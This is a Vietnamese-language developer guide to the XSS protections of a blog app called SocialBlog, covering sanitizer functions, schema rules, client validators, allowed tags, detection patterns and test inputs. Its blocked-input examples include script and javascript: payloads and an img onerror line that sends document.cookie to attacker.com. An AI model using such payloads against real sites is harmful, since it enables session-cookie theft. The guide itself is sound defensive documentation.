# XSS Protection & Script Validation Guide

## 🛡️ Tổng quan bảo vệ

Ứng dụng SocialBlog đã được trang bị các biện pháp bảo vệ toàn diện để chống lại XSS (Cross-Site Scripting) attacks khi người dùng đăng bài:

### 1. **Server-Side Validation** (`server/sanitizer.ts`)

#### Các hàm chính:

```typescript
// Sanitize HTML content - loại bỏ script độc hại
sanitizeHtml(dirty: string): string

// Phát hiện các mối đe dọa XSS
detectXSSTreats(content: string): { isClean: boolean; threats: string[] }

// Sanitize plain text input
sanitizeText(text: string, maxLength: number): string

// Validate tags
validateTags(tags: unknown): string[]

// Validate URLs
validateUrl(url: string): boolean

// Validate image URLs
validateImageUrl(url: string): boolean
```

#### Các loại mối đe dọa được phát hiện:

- ✅ Script tags: `<script>alert('xss')</script>`
- ✅ Event handlers: `onclick="malicious()"`, `onload="..."`
- ✅ JavaScript protocol: `javascript:alert()`
- ✅ Dangerous data URLs: `data:text/html`
- ✅ iFrame injection: `<iframe src="...">`
- ✅ Object/Embed tags: `<object>`, `<embed>`
- ✅ Form submission: `<form action="...">`
- ✅ SVG with scripts: `<svg><script>...</script></svg>`

### 2. **Schema Validation** (`shared/schema.ts`)

Post schema bao gồm các validation rules:

```typescript
insertPostSchema = {
  title: z.string()
    .min(3).max(500)
    .refine(val => !/<script|<iframe|<object|javascript:|on\w+=|<form/i.test(val))
    
  content: z.string()
    .min(5).max(50000)
    .refine(val => !dangerousPatterns.some(p => p.test(val)))
    
  tags: z.array(z.string()
    .min(1).max(50)
    .regex(/^[a-zA-Z0-9\s\-_]+$/, "Invalid characters")
  ).max(20)
  
  images: z.array(z.string()
    .url()
    .refine(url => validImageFormats.includes(url))
  ).max(10)
}
```

### 3. **Client-Side Real-Time Validation** (`client/src/lib/content-validator.ts`)

Cảnh báo người dùng ngay khi họ nhập nội dung nguy hiểm:

```typescript
// Phát hiện XSS trên client
detectClientXSSTreats(content: string): XSSDetectionResult

// Validate độ dài text
validateTextLength(text: string, maxLength: number): { isValid: boolean; message: string }

// Validate tags format
validateClientTags(tags: string[]): { isValid: boolean; message: string }

// Validate image URLs
validateClientImageUrl(url: string): { isValid: boolean; message: string }

// Toàn bộ post validation
validatePostContent(data: PostData): { isValid: boolean; errors: Record<string, string> }
```

### 4. **Create Post Page Updates** (`client/src/pages/create-post.tsx`)

Cải tiến giao diện:

- ✅ **Real-time validation** - Kiểm tra khi người dùng gõ
- ✅ **Character counter** - Hiển thị số ký tự đã nhập
- ✅ **Security warnings** - Cảnh báo nội dung nguy hiểm
- ✅ **Validation errors** - Hiển thị lỗi chi tiết
- ✅ **Disabled publish button** - Vô hiệu hóa khi có lỗi

### 5. **API Endpoints Protection**

#### POST `/api/posts` (Tạo bài)
```
1. Validate schema
2. Kiểm tra XSS trong title
3. Kiểm tra XSS trong content
4. Sanitize HTML content
5. Validate & sanitize tags
6. Validate image URLs
7. Lưu dữ liệu đã sanitize
```

#### PUT `/api/posts/:id` (Chỉnh sửa bài)
```
1. Validate schema
2. Kiểm tra XSS nếu có update title
3. Kiểm tra XSS nếu có update content
4. Sanitize HTML nếu cần
5. Validate tags & images nếu cần
```

#### POST `/api/posts/:id/comments` (Thêm bình luận)
```
1. Validate schema
2. Kiểm tra XSS trong comment content
3. Sanitize HTML content
4. Lưu comment đã sanitize
```

---

## 🔍 Các mẫu XSS bị chặn

### Ví dụ 1: Script Injection
```html
<!-- ❌ Bị chặn -->
<p>Hello <script>alert('xss')</script> World</p>

<!-- ✅ Sau sanitize -->
<p>Hello  World</p>
```

### Ví dụ 2: Event Handlers
```html
<!-- ❌ Bị chặn -->
<img src="x" onerror="fetch('https://attacker.com/steal?data='+document.cookie)">

<!-- ✅ Sau sanitize -->
<img src="x">
```

### Ví dụ 3: JavaScript Protocol
```html
<!-- ❌ Bị chặn -->
<a href="javascript:alert('xss')">Click me</a>

<!-- ✅ Sau sanitize -->
<a>Click me</a>
```

### Ví dụ 4: Data URL with HTML
```html
<!-- ❌ Bị chặn -->
<iframe src="data:text/html,<script>alert('xss')</script>"></iframe>

<!-- ✅ Sau sanitize -->
<!-- Bị loại bỏ hoàn toàn -->
```

---

## 📊 HTML Tags được cho phép

Các tag HTML được cho phép trong content:

**Text Formatting:**
- `<p>`, `<strong>`, `<em>`, `<u>`, `<mark>`, `<del>`, `<ins>`
- `<sub>`, `<sup>`, `<br>`, `<hr>`

**Headings:**
- `<h2>`, `<h3>`, `<h4>`, `<h5>`, `<h6>`

**Lists:**
- `<ul>`, `<ol>`, `<li>`

**Code:**
- `<code>`, `<pre>`

**Quotes:**
- `<blockquote>`

**Tables:**
- `<table>`, `<thead>`, `<tbody>`, `<tr>`, `<th>`, `<td>`

**Media:**
- `<img>` (với `src`, `alt`, `width`, `height`, `loading`)
- `<a>` (với `href`, `title`, `target`, `rel`)

**Other:**
- `<div>`, `<span>` (với `class` và `style`)

---

## 🚨 Attributes được cho phép

- **Links**: `href`, `title`, `target`, `rel`
- **Images**: `src`, `alt`, `width`, `height`, `loading`
- **General**: `class`, `style`

---

## ⚙️ Cài đặt phía client

### Import validators:
```typescript
import { 
  detectClientXSSTreats,
  validatePostContent,
  validateClientTags,
  validateClientImageUrl
} from '@/lib/content-validator';
```

### Sử dụng:
```typescript
// Kiểm tra real-time
const xssResult = detectClientXSSTreats(title);
if (!xssResult.isClean) {
  console.warn('Detected threats:', xssResult.threats);
}

// Validate post trước submit
const validation = validatePostContent({
  title: title,
  content: content,
  tags: tags,
  images: images
});

if (!validation.isValid) {
  console.error('Validation errors:', validation.errors);
}
```

---

## ⚙️ Cài đặt phía server

### Import sanitizers:
```typescript
import {
  sanitizeHtml,
  detectXSSTreats,
  validateTags,
  validateImageUrl
} from './sanitizer';
```

### Sử dụng:
```typescript
// Phát hiện threats
const xssResult = detectXSSTreats(userContent);
if (!xssResult.isClean) {
  return res.status(400).json({
    error: 'Content contains dangerous scripts',
    details: xssResult.threats
  });
}

// Sanitize content
const cleanContent = sanitizeHtml(userContent);

// Validate tags
const cleanTags = validateTags(userTags);
```

---

## 📋 Best Practices

### Cho Developer:

1. **Luôn validate trên server** - Không tin client-side validation
2. **Sanitize HTML output** - Lưu dữ liệu clean vào database
3. **Set CSP headers** - Thêm vào để bảo vệ thêm:
   ```javascript
   app.use(helmet()); // Middleware helmet nên được thêm vào
   ```
4. **Regular updates** - Cập nhật DOMPurify & dependencies thường xuyên

### Cho User:

1. **Không paste code từ nguồn không tin cậy**
2. **Kiểm tra warning messages** - Ứng dụng sẽ cảnh báo nếu nội dung nguy hiểm
3. **Báo cáo XSS** - Nếu phát hiện lỗ hổng bảo mật, báo cáo cho admin

---

## 🧪 Testing XSS Protection

Bạn có thể test bảo vệ bằng cách:

### Test 1: Script Tag
```
Nhập trong title: Hello <script>alert('xss')</script> World
Kết quả: ❌ Bị chặn - "Script tags detected"
```

### Test 2: Event Handler
```
Nhập trong content: <img src=x onerror=alert('xss')>
Kết quả: ❌ Bị chặn - "Event handlers detected"
```

### Test 3: JavaScript Protocol
```
Nhập trong link: <a href="javascript:alert('xss')">Click</a>
Kết quả: ❌ Bị chặn - "JavaScript protocol detected"
```

### Test 4: Valid HTML
```
Nhập: <p><strong>Bold text</strong> and <em>italic</em></p>
Kết quả: ✅ Được phép - HTML hợp lệ được lưu
```

---

## 📞 Liên hệ hỗ trợ

Nếu có câu hỏi hoặc phát hiện vấn đề bảo mật:
- Liên hệ admin
- Báo cáo issue trên GitHub
- Gửi feedback qua form liên hệ
